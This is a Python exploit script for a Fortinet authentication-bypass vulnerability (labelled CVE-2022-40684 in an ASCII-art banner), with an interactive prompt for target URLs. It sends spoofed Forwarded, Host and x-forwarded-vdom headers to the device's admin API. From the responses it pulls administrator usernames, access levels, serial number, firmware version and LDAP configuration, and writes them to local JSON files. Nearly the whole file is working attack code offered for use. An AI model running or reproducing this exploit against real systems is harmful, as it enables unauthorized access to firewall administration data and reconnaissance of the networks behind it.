#!/usr/bin/env python3
import requests
import sys
import readline
import urllib3
import json 
import argparse
import requests
import pandas as pd
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def exploit(target,username):

    if target[-1] == "/":
        target = target[:-1]
        
    print("Exploiting target: {}".format(target))
    headers = {
        "user-agent": "Node.js",
        "accept-encoding": "gzip, deflate",
        "Host": "127.0.0.1:9980",
        "forwarded": 'by="[127.0.0.1]:80";for="[127.0.0.1]:49490";proto=http;host=',
        "x-forwarded-vdom": "root",
    }

    r1 = requests.get(target + f"/api/v2/cmdb/system/admin/{username}", headers=headers, verify=False)
    r2 = requests.get(target + "/api/v2/cmdb/user/ldap", headers=headers, verify=False)
    if(r1.status_code == 200 and r2.status_code == 200):       
        
        print("\033[92m[+] The target {} is vulnerable\033[0m".format(target))
        data = json.loads(r1.text) 
               
        for user in data['results']:
            print("\033[93m[+]\033[0m Admin username: {}".format(user['name']))            
            print("\033[93m[+]\033[0m Level access: {}".format(user['accprofile']))
        print("[+] Serial: {}".format(data['serial']))
        print("[+] Version: {}".format(data['version']))            
        filename = generate_json_file(data,'system_admin.json')
        print(f'[+] saving location data /api/v2/cmdb/system/admin/{username} -> system_admin.json') 
        print(filename)  
            
        data1 = json.loads(r2.text) 
        print('')      
        print("[+] Leaking ldap config") 
        print("[+] LDAP name: ".format(data1['name']))       
        print("\033[93m[+]\033[0m LDAP http_status: {}".format(data1['http_status']))  
        print("\033[93m[+]\033[0m LDAP vdom: {}".format(data1['vdom']))             
        print("\033[93m[+]\033[0m LDAP path: {}".format(data1['path']))        
        filename = generate_json_file(data1,'user_ldap.json')
        print(f'[+] Saving location data /api/v2/cmdb/user/ldap -> user_ldap.json')
        print(filename)  
            
        
    else:
        print("[-] The target is not vulnerable")    


    
    
def generate_json_file(data, name):
    try:        
        with open(name, 'w', encoding='utf-8') as f:
            f.write(json.dumps(data, indent=4))      
       
        message = '\033[92m[+] File status: ok\033[0m'
    except Exception as e:        
        message = '\033[91m[-] File status: bad\033[0m'
        print(f"Error: {e}")
    return message
    
def validate_ip(ip):
    if not ip.startswith('http://') or ip.count('.') != 3:
        return False
    return True
    
Art="""                                        ⣀⡠⢤⡀⠀⠀⠀
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
     ⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
     ⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
     ⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
     ⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
     ⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
     ⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
     ⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
     ⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
                    +-++-++-++-++-++-++-++-++-+ +-++-++-++-++-++-+  
                    |f||o||r||t||i||g||a||t||e| |v||7||.||0||.||0|
                    +-++-++-++-++-++-++-++-++-+ +-++-++-++-++-++-+
                       +-++-++-+ +-++-++-++-++-++-++-++-++-++-+ 
                       |c||v||e| |2||0||2||2||-||4||0||6||8||4| 
                       +-++-++-+ +-++-++-++-++-++-++-++-++-++-+
                              
                              """  
if __name__ == "__main__":
      print(Art)    
      print("Usage:    <target>  username")
      print("Example:  https://target:8443  admin")
      print("")
      print("When you do not define <username>, the default username is used: <admin>")
      print("Example:  https://target:8443 ")
      print("")    
        
    
      while True:
          
          print('')
          print('To exit the program type: exit')
          print('')
          user_input = input("<exploit>: ")
        
          if user_input.lower() == 'exit':
             break  
          parts = user_input.split()
           
          if len(parts) == 1:
           # Si solo se proporciona una parte (solo dirección IP), asumir un valor predeterminado para el nombre de usuario 
             ip_address = parts[0]            
             username = 'admin'            
          elif len(parts) == 2:
          # Si se proporcionan dos partes, usar la primera como dirección IP y la segunda como nombre de usuario
             ip_address, username = parts             
          else:
             print("Invalid input format. Please provide both IP address and username or just the IP address.")
             continue 
             
          if not validate_ip(ip_address):
             print("Invalid IP address format. Please use 'http://x.x.x.x' format.")
             continue 
          exploit(ip_address,username)               
    
      print("The program concludes its execution")

